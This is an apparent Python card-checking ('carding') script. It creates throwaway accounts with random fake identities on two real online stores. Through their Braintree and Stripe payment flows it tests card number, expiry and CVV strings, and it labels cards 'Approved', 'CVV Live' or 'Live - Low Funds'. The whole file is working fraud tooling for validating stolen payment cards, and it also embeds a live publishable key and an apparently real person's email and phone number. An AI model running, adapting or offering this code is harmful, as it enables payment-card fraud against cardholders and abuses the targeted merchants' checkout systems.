import os

try:
    import pyfiglet, user_agent, time
    import requests
    import re
    import base64
    import random
    import string
    from uuid import uuid4
    
except ImportError as e:
    print("حدث خطأ في استدعاء مكتبة:", e)
    print("يتم تثبيت المكتبات...")
    os.system('pip install pyfiglet user_agent requests')
    import pyfiglet
    import user_agent
    import time
    import requests
    import re
    import base64
    import random
    import string
    from uuid import uuid4


def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:
		yy = yy.split("20")[1]
		
	user = user_agent.generate_user_agent()
		
	r = requests.session()
	r.follow_redirects = True
	r.verify = False

	def generate_full_name():
		first_names = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour", 
					   "Hannah", "Yara", "Khaled", "Sara", "Lina", "Nada", "Hassan",
					   "Amina", "Rania", "Hussein", "Maha", "Tarek", "Laila", "Abdul", "Hana", "Mustafa",
					   "Leila", "Kareem", "Hala", "Karim", "Nabil", "Samir", "Habiba", "Dina", "Youssef", "Rasha",
					   "Majid", "Nabil", "Nadia", "Sami", "Samar", "Amal", "Iman", "Tamer", "Fadi", "Ghada",
					   "Ali", "Yasmin", "Hassan", "Nadia", "Farah", "Khalid", "Mona", "Rami", "Aisha", "Omar",
					   "Eman", "Salma", "Yahya", "Yara", "Husam", "Diana", "Khaled", "Noura", "Rami", "Dalia",
					   "Khalil", "Laila", "Hassan", "Sara", "Hamza", "Amina", "Waleed", "Samar", "Ziad", "Reem",
					   "Yasser", "Lina", "Mazen", "Rana", "Tariq", "Maha", "Nasser", "Maya", "Raed", "Safia",
					   "Nizar", "Rawan", "Tamer", "Hala", "Majid", "Rasha", "Maher", "Heba", "Khaled", "Sally"]
		last_names = ["Khalil", "Abdullah", "Alwan", "Shammari", "Maliki", "Smith", "Johnson", "Williams", "Jones", "Brown",
					   "Garcia", "Martinez", "Lopez", "Gonzalez", "Rodriguez", "Walker", "Young", "White",
					   "Ahmed", "Chen", "Singh", "Nguyen", "Wong", "Gupta", "Kumar",
					   "Gomez", "Lopez", "Hernandez", "Gonzalez", "Perez", "Sanchez", "Ramirez", "Torres", "Flores", "Rivera",
					   "Silva", "Reyes", "Alvarez", "Ruiz", "Fernandez", "Valdez", "Ramos", "Castillo", "Vazquez", "Mendoza",
					   "Bennett", "Bell", "Brooks", "Cook", "Cooper", "Clark", "Evans", "Foster", "Gray", "Howard",
					   "Hughes", "Kelly", "King", "Lewis", "Morris", "Nelson", "Perry", "Powell", "Reed", "Russell",
					   "Scott", "Stewart", "Taylor", "Turner", "Ward", "Watson", "Webb", "White", "Young"]
		full_name = random.choice(first_names) + " " + random.choice(last_names)
		first_name, last_name = full_name.split()
		return first_name, last_name
			
	def generate_address():
		cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix", "Philadelphia", "San Antonio", "San Diego", "Dallas", "San Jose"]
		states = ["NY", "CA", "IL", "TX", "AZ", "PA", "TX", "CA", "TX", "CA"]
		streets = ["Main St", "Park Ave", "Oak St", "Cedar St", "Maple Ave", "Elm St", "Washington St", "Lake St", "Hill St", "Maple St"]
		zip_codes = ["10001", "90001", "60601", "77001", "85001", "19101", "78201", "92101", "75201", "95101"]

		city = random.choice(cities)
		state = states[cities.index(city)]
		street_address = str(random.randint(1, 999)) + " " + random.choice(streets)
		zip_code = zip_codes[states.index(state)]
		return city, state, street_address, zip_code
			
	first_name, last_name = generate_full_name()
	city, state, street_address, zip_code = generate_address()
			
	def generate_random_account():
		name = ''.join(random.choices(string.ascii_lowercase, k=20))
		number = ''.join(random.choices(string.digits, k=4))
		return f"{name}{number}@gmail.com"
	
	acc = generate_random_account()
		
	def username_gen():
		name = ''.join(random.choices(string.ascii_lowercase, k=20))
		number = ''.join(random.choices(string.digits, k=20))
		return f"{name}{number}"
	
	username = username_gen()
			
	headers = {
	     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	     'cache-control': 'no-cache',
	     'pragma': 'no-cache',
	     'user-agent': user,
	 }
	 
	response = r.get('https://www.thevacuumfactory.com/my-account/', headers=headers)
	register = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response.text).group(1)
	 
	headers = {
	     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	     'cache-control': 'no-cache',
	     'content-type': 'application/x-www-form-urlencoded',
	     'pragma': 'no-cache',
	     'user-agent': user,
	 }
	 
	data = {
	     'username': username,
	     'email': acc,
	     'password': 'Ah2002Ah!',
	     'woocommerce-register-nonce': register,
	     '_wp_http_referer': '/my-account/',
	     'register': 'Register',
	 }
	 
	response = r.post('https://www.thevacuumfactory.com/my-account/', headers=headers, data=data)
	 
	headers = {
	     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	     'cache-control': 'no-cache',
	     'pragma': 'no-cache',
	     'user-agent': user,
	 }
	 
	response = r.get('https://www.thevacuumfactory.com/my-account/edit-address/billing/', cookies=r.cookies, headers=headers)
	address = re.search(r'name="woocommerce-edit-address-nonce" value="(.*?)"', response.text).group(1)
	
	headers = {
	    'authority': 'www.thevacuumfactory.com',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'cache-control': 'max-age=0',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://www.thevacuumfactory.com',
	    'referer': 'https://www.thevacuumfactory.com/my-account/edit-address/billing/',
	    'user-agent': user,
	}
	
	data = {
	    'billing_first_name': first_name,
	    'billing_last_name': last_name,
	    'billing_company': '',
	    'billing_country': 'US',
	    'billing_address_1': street_address,
	    'billing_address_2': '',
	    'billing_city': city,
	    'billing_state': state,
	    'billing_postcode': zip_code,
	    'billing_phone': '5032580987',
	    'billing_email': acc,
	    'save_address': 'Save address',
	    'woocommerce-edit-address-nonce': address,
	    '_wp_http_referer': '/my-account/edit-address/billing/',
	    'action': 'edit_address',
	}
	
	response = r.post('https://www.thevacuumfactory.com/my-account/edit-address/billing/', cookies=r.cookies, headers=headers, data=data)
	 
	headers = {
	     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	     'cache-control': 'no-cache',
	     'pragma': 'no-cache',
	     'user-agent': user,
	 }
	 
	response = r.get('https://www.thevacuumfactory.com/my-account/add-payment-method/', cookies=r.cookies, headers=headers)
	add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)
	client = re.search(r'client_token_nonce":"([^"]+)"', response.text).group(1)
	 
	headers = {
	     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	     'cache-control': 'no-cache',
	     'content-type': 'application/x-www-form-urlencoded',
	     'pragma': 'no-cache',
	     'user-agent': user,
	 }
	  
	data = {
	      'action': 'wc_braintree_credit_card_get_client_token',
	      'nonce': client,
	 }
	  
	response = r.post('https://www.thevacuumfactory.com/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data)
	enc = response.json()['data']
	dec = base64.b64decode(enc).decode('utf-8')
	au = re.findall(r'"authorizationFingerprint":"(.*?)"', dec)[0]
	  
	headers = {
	      'authority': 'payments.braintree-api.com',
	      'accept': '*/*',
	      'authorization': f'Bearer {au}',
	      'braintree-version': '2018-05-10',
	      'cache-control': 'no-cache',
	      'content-type': 'application/json',
	      'pragma': 'no-cache',
	      'user-agent': user,
	  }
	  
	json_data = {
	    'clientSdkMetadata': {
	        'source': 'client',
	        'integration': 'custom',
	        'sessionId': 'a8a54511-3469-4ac4-aae6-1b4ce202e438',
	    },
	    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
	    'variables': {
	        'input': {
	            'creditCard': {
	                'number': n,
	                'expirationMonth': mm,
	                'expirationYear': yy,
	                'cvv': cvc,
	            },
	            'options': {
	                'validate': False,
	            },
	        },
	    },
	    'operationName': 'TokenizeCreditCard',
	}
	
	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	  
	try:
	  tok = response.json()['data']['tokenizeCreditCard']['token']
	except:
	  return "Tokenization Failed"
	  
	headers = {
	     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	     'cache-control': 'no-cache',
	     'content-type': 'application/x-www-form-urlencoded',
	     'pragma': 'no-cache',
	     'user-agent': user,
	 }
	  
	data = {
	      'payment_method': 'braintree_credit_card',
	      'wc-braintree-credit-card-card-type': 'master-card',
	      'wc-braintree-credit-card-3d-secure-enabled': '',
	      'wc-braintree-credit-card-3d-secure-verified': '',
	      'wc-braintree-credit-card-3d-secure-order-total': '0.00',
	      'wc_braintree_credit_card_payment_nonce': tok,
	      'wc_braintree_device_data': '',
	      'wc-braintree-credit-card-tokenize-payment-method': 'true',
	      'woocommerce-add-payment-method-nonce': add_nonce,
	      '_wp_http_referer': '/my-account/add-payment-method/',
	      'woocommerce_add_payment_method': '1',
	  }
	  
	response = r.post('https://www.thevacuumfactory.com/my-account/add-payment-method/', cookies=r.cookies, headers=headers, data=data)
	text = response.text
	pattern = r'Status code (.*?)\s*</li>'
	match = re.search(pattern, text)
	
	if match:
		result = match.group(1)
		if 'risk_threshold' in text:
			result = "RISK: Retry this BIN later."
	else:
		if 'Nice! New payment method added' in text or 'Payment method successfully added.' in text:
			result = "1000: Approved"
		else:
			result = "Error"
	
	if 'funds' in result or 'added' in result or 'FUNDS' in result or 'CHARGED' in result or 'Funds' in result or 'avs' in result or 'postal' in result or 'approved' in result or 'Nice!' in result or 'Approved' in result or 'cvv: Gateway Rejected: cvv' in result or 'does not support this type of purchase.' in result or 'Duplicate' in result or 'Successful' in result or 'Authentication Required' in result or 'successful' in result or 'Thank you' in result or 'confirmed' in result or 'successfully' in result or 'INVALID_BILLING_ADDRESS' in result:
			return 'Approved'
	else:
		return result


def sq(card):
	return 'Your card was declined.'
	

def stripe(ccx):
	ccx = ccx.strip()
	try:
		parts = ccx.split('|')
		if len(parts) != 4:
			return "Invalid Card Format"
		n = parts[0].replace(' ', '')
		mm = parts[1].zfill(2)
		yy = parts[2]
		cvc = parts[3].replace('\n', '')
		if len(yy) == 4:
			yy = yy[-2:]
	except Exception:
		return "Invalid Card Format"

	site_url = 'https://www.gbradburyltd.co.uk'
	stripe_pk = 'pk_live_51TXK24JwY9cexbFxKOcl5gPMw7QPuRmBoTUh2SR2sNo8tGYZbjwSdKi6c6rzH8CnuelNtDdCXSkwBxTzP704o6eM00beQr7w6p'

	session = requests.Session()
	
	try:
		session.get(f'{site_url}/', headers={'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36'}, timeout=10)
		
		cart_data = {
			'success_message': '"1 LT BRACKET 1x1" has been added to your cart',
			'product_sku': 'D023AEV',
			'product_id': '1780',
			'quantity': '1',
		}
		session.post(f'{site_url}/', params={'wc-ajax': 'add_to_cart'}, data=cart_data, timeout=10)
		
		get_checkout = session.get(f'{site_url}/checkout/', timeout=10)
		nonce_match = re.search(r'name="woocommerce-process-checkout-nonce"\s+value="([^"]+)"', get_checkout.text)
		checkout_nonce = nonce_match.group(1) if nonce_match else '29829fefec'
	except Exception:
		checkout_nonce = '29829fefec'

	stripe_url = 'https://api.stripe.com/v1/payment_methods'
	stripe_headers = {
		'authority': 'api.stripe.com',
		'accept': 'application/json',
		'content-type': 'application/x-www-form-urlencoded',
		'origin': 'https://js.stripe.com',
		'referer': 'https://js.stripe.com/v3/fa46e8c816/m/parent.html',
		'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36'
	}
	
	client_session_id = str(uuid4())
	elements_session_id = f"elements_session_{''.join(random.choices(string.ascii_letters + string.digits, k=12))}"
	
	stripe_data = {
		'billing_details[name]': 'Eslam Ramadan',
		'billing_details[email]': 'eslamramadanv1@gmail.com',
		'billing_details[phone]': '+201153262807',
		'billing_details[address][city]': 'new york',
		'billing_details[address][country]': 'GB',
		'billing_details[address][line1]': 'new yirl',
		'billing_details[address][line2]': '',
		'billing_details[address][postal_code]': 'EC1A 1BB',
		'billing_details[address][state]': '',
		'type': 'card',
		'card[number]': n,
		'card[cvc]': cvc,
		'card[exp_year]': yy,
		'card[exp_month]': mm,
		'allow_redisplay': 'unspecified',
		'payment_user_agent': 'stripe.js/9e9080bb94; stripe-js-v3/9e9080bb94; payment-element; deferred-intent; autopm',
		'referrer': site_url,
		'time_on_page': str(random.randint(30000, 120000)),
		'client_attribution_metadata[client_session_id]': client_session_id,
		'client_attribution_metadata[merchant_integration_source]': 'elements',
		'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
		'client_attribution_metadata[merchant_integration_version]': '2021',
		'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
		'client_attribution_metadata[payment_method_selection_flow]': 'automatic',
		'client_attribution_metadata[elements_session_id]': elements_session_id,
		'client_attribution_metadata[elements_session_config_id]': str(uuid4()),
		'client_attribution_metadata[merchant_integration_additional_elements][0]': 'payment',
		'key': stripe_pk,
		'_stripe_version': '2025-09-30.clover'
	}

	try:
		r1 = session.post(stripe_url, headers=stripe_headers, data=stripe_data, timeout=15)
		r1_json = r1.json()
		
		if 'id' not in r1_json:
			err_text = r1_json.get('error', {}).get('message', 'Stripe Error')
			return f"Declined: {err_text}"
			
		payment_method_id = r1_json['id']
	except Exception:
		return "Connection Error on Stripe"

	checkout_url = f'{site_url}/?wc-ajax=checkout'
	checkout_headers = {
		'authority': 'www.gbradburyltd.co.uk',
		'accept': 'application/json, text/javascript, */*; q=0.01',
		'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
		'origin': site_url,
		'referer': f'{site_url}/checkout/',
		'x-requested-with': 'XMLHttpRequest',
		'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36'
	}
	
	checkout_data = {
		'billing_email': 'eslamramadanv1@gmail.com',
		'billing_first_name': 'Eslam',
		'billing_last_name': 'Ramadan',
		'billing_country': 'GB',
		'billing_address_1': 'new yirl',
		'billing_address_2': '',
		'billing_city': 'new york',
		'billing_state': '',
		'billing_postcode': 'EC1A 1BB',
		'billing_phone': '+201153262807',
		'shipping_country': 'GB',
		'shipping_method[0]': 'wbs:5:83d48455_standard_delivery',
		'payment_method': 'stripe',
		'wc-stripe-selected-upe-payment-type': 'card',
		'terms': 'on',
		'terms-field': '1',
		'woocommerce-process-checkout-nonce': checkout_nonce,
		'_wp_http_referer': f'{site_url}/checkout/',
		'wc-stripe-payment-method': payment_method_id
	}

	try:
		r2 = session.post(checkout_url, headers=checkout_headers, data=checkout_data, timeout=15)
		res_json = r2.json()
		messages = res_json.get('messages', '')
		
		if "Your card's security code is" in messages or "security code" in messages or "incorrect_cvc" in messages:
			return "CVV Live"
		elif "insufficient funds" in messages:
			return "Live - Low Funds"
		elif "success" in res_json.get('result', ''):
			return "Approved"
		else:
			clean_msg = re.sub(r'<[^>]+>', '', str(messages))
			return f"Declined: {clean_msg}"
	except Exception:
		return "Error in Checkout Response"
